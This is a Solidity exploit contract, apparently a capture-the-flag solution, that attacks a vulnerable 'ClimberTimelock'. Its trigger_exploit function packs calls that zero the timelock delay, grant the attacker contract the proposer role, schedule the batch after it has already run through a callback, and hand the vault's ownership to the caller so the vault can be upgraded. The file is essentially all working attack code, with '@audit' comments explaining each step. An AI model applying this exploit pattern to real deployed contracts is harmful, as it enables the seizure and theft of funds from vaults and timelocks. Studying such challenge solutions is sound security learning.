pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol"; 
import "../climber/ClimberTimelock.sol";

contract TimelockExploit {

    // params for scheduling & executing the calls
    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;
    bytes32 public salt;

    ClimberTimelock public timelock; // vulnerable timelock
    bytes32 public PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    constructor (
        address payable _timelock,
        address _vault
    ) {

        timelock = ClimberTimelock(_timelock);

        targets = [
            address(timelock), // call 1's contract
            address(timelock), // call 2's contract
            address(this),     // call 3's contract
            address(_vault)    // call 4's contract
        ];

        values = [
            0,  // no value set for any call
            0,
            0,
            0
        ];

        salt = keccak256("SALT");
    }

    function trigger_exploit() external {

        // 1. Remove delay time on the timelock contract.
        // @audit : entire call: timelock.updateDelay(0);
        dataElements.push(
            abi.encodeWithSignature(
                "updateDelay(uint64)",
                0
            )
        );

        // 2. Grant PROPOSER role so that we can schedule tasks.
        // @audit : entire call: timelock.grantRole(msg.sender, PROPOSER_ROLE);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                PROPOSER_ROLE,
                address(this)
            )
        );

        // 3. Schedule the calls through this contract.
        // @audit : entire call : this.trigger_schedule(); -> timelock.schedule(...);
        dataElements.push(
            abi.encodeWithSignature(
                "trigger_schedule()"
            )
        );

        // 4. Transfer vulnerable's vault ownership to us so that we can upgrade it.
        // @audit : entire call: vault.transferOwnership(msg.sender); 
        dataElements.push(
            abi.encodeWithSignature(
                "transferOwnership(address)",
                msg.sender
            )
        );

        // 5. Execute the calls.
        timelock.execute(
            targets,
            values,
            dataElements,
            salt
        );
    }

    // Timelock will trigger this when executing the scheduled commands; scheduling otherwise it would fuck up recursivelly
    function trigger_schedule() public {
        timelock.schedule(
            targets,
            values,
            dataElements,
            salt
        );
    }
}